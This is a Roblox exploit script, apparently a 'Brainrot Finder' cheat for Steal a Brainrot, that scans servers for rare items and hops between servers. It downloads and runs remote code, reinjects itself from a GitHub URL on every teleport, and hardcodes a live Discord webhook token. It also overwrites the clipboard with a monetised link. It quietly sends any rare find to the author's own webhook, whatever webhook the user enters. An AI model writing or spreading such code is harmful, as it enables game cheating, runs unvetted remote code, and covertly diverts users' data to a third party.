pcall(function()
    setclipboard("https://link-center.net/1375465/YAC3CDe8HuMX")
end)

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local webhookOriginal = "https://discord.com/api/webhooks/1398765862835458110/yPDUCwGfwrDAkV9y1LwKDbawWTUWLE6810Y2Dh732FnKG1UiIgLnsMrSAJ3-opRkAAHu"

local brainrots = {
	"Cocofanto Elephanto",
	"Girafa Celestre",
	"Tralalero Tralala",
	"Odin Din Din Dun",
	"Tigroligre Frutonni",
	"Espresso Signora",
	"Orcalero Orcala",
	"La Vacca Saturno Saturnita",
	"Los Tralaleritos",
	"Graipuss Medussi",
	"La Grande Combinasion",
	"Matteo"
}

local rareBrainrots = {
	["La Vacca Saturno Saturnita"] = true,
	["Graipuss Medussi"] = true,
	["La Grande Combinasion"] = true,
	["Los Tralaleritos"] = true
}

local running = false
local stopOnRare = false
local teleporting = false

local selectedNotifyModels = {}
local selectedDetectModels = {}

-- Auto-reinject on teleport
local scriptURL = "https://raw.githubusercontent.com/bypassv5/SabChecker/refs/heads/main/test.lua"
if queue_on_teleport then
    queue_on_teleport("loadstring(game:HttpGet('"..scriptURL.."'))()")
end

-- Utility HTTP Request function (works with Synapse, Fluxus, etc)
local function requestHttp(tbl)
	local req = (syn and syn.request) or http_request or (fluxus and fluxus.request)
	if not req then warn("No HTTP request function found.") return false end
	return req(tbl)
end

local function scanBrainrots()
	local found = {}
	for _, name in ipairs(selectedDetectModels) do
		local obj = workspace:FindFirstChild(name)
		if obj then
			table.insert(found, name)
		end
	end
	return found
end

local function sendWebhook(foundModels)
	if #foundModels == 0 then return end

	local pingEveryone = false
	for _, name in ipairs(foundModels) do
		if rareBrainrots[name] then
			pingEveryone = true
			break
		end
	end

	local msg = (pingEveryone and "@everyone\n" or "") ..
		"✅ Script injected. JobId: `" .. game.JobId .. "`"

	msg ..= "\nFound brainrots:\n- " .. table.concat(foundModels, "\n- ")

	-- Add teleport code in message
	msg ..= "\n\nJoin: `game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" ..
		game.PlaceId .. ', "' .. game.JobId .. '")`'

	-- If pingEveryone, send to original webhook, else send to user webhook
	local targetWebhook = pingEveryone and webhookOriginal or webhookURL

	pcall(function()
		requestHttp({
			Url = targetWebhook,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode({content = msg})
		})
	end)

	if pingEveryone and stopOnRare then
		print("[HALT] Rare brainrot found. Stopping auto-hop.")
		running = false
	end
end

local function getOnePlayerServers()
	local ok, res = pcall(function()
		return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
	end)
	if not ok then return {} end

	local list = {}
	for _, server in ipairs(res.data) do
		if server.playing == 1 and server.id ~= game.JobId then
			table.insert(list, server.id)
		end
	end
	return list
end

local function tryTeleport(serverId)
	if teleporting then return false end
	teleporting = true
	local success, err = pcall(function()
		TeleportService:TeleportToPlaceInstance(game.PlaceId, serverId, LocalPlayer)
	end)
	teleporting = false
	if not success then
		warn("[Teleport Error]", err)
	end
	return success
end

local function hopLoop()
	while running do
		local found = scanBrainrots()
		sendWebhook(found)
		if not running then break end
		task.wait(0.5)

		local servers = getOnePlayerServers()
		if #servers >= 30 then
			local serverId = servers[30]
			if tryTeleport(serverId) then
				print("[HOP] Teleporting to", serverId)
				break
			else
				task.wait(1)
			end
		else
			task.wait(1)
		end
	end
end

TeleportService.TeleportInitFailed:Connect(function()
	print("[Teleport Failed] Rejoining current server...")
	TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end)

local Window = Rayfield:CreateWindow({
	Name = "Brainrot Finder",
	LoadingTitle = "Loading Brainrot Finder...",
	LoadingSubtitle = "",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "BrainrotFinderConfig",
		FileName = "Config"
	},
	KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
        Title = "Steal a brainrot finder",
        Subtitle = "Key System",
        Note = "Key copied to clipboard. If it isn't, get your key here: https://link-center.net/1375465/YAC3CDe8HuMX",
        FileName = "BrainrotKey", -- Unique filename to avoid conflicts
        SaveKey = false, -- Change to true if you want to save key locally
        Key = {"8MWlRfVTijY88Lk43h59ofCnC0iuxhoc"} -- Your accepted key(s)
    }
})

local Tab = Window:CreateTab("Main")

-- Webhook input
local webhookURL = webhookOriginal -- default to original webhook

local webhookInput = Tab:CreateInput({
	Name = "Webhook URL (for normal pings)",
	PlaceholderText = "Enter your Discord webhook URL",
	RemoveTextAfterFocusLost = false,
	OnChanged = function(text)
		webhookURL = text
	end
})

-- Dropdown for models to detect
local detectDropdown = Tab:CreateDropdown({
	Name = "Select brainrots to detect",
	MultiSelect = true,
	Options = brainrots,
	CurrentOptions = brainrots,
	Flag = "DetectDropdown",
	Callback = function(selection)
		selectedDetectModels = selection
	end
})

-- Dropdown for models to notify about (send webhook on)
local notifyDropdown = Tab:CreateDropdown({
	Name = "Select brainrots to notify about",
	MultiSelect = true,
	Options = brainrots,
	CurrentOptions = brainrots,
	Flag = "NotifyDropdown",
	Callback = function(selection)
		selectedNotifyModels = selection
	end
})

-- Stop on rare toggle
local stopToggle = Tab:CreateToggle({
	Name = "Stop on rare brainrot found",
	CurrentValue = false,
	Flag = "StopOnRareToggle",
	Callback = function(value)
		stopOnRare = value
	end
})

-- Start hopping toggle
local hoppingToggle = Tab:CreateToggle({
	Name = "Start Hopping",
	CurrentValue = false,
	Flag = "StartHoppingToggle",
	Callback = function(value)
		if value then
			if not running then
				running = true
				task.spawn(hopLoop)
			end
		else
			running = false
		end
	end
})

-- Start hopping default off
running = false

Rayfield:Notify({
	Title = "Brainrot Finder",
	Content = "Loaded! Use the toggles and dropdowns to configure.",
	Duration = 5,
	Image = 4483362458
})

-- Start UI
Rayfield:LoadConfiguration()
